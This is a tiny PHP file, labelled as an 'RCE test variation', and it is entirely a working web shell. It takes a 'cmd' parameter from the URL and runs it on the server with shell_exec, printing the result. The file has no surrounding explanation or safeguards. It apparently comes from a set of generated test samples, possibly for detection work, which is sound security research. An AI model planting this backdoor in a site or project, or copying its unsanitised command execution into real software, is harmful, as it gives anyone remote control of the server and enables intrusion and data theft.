<?php
// RCE test variation #922
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>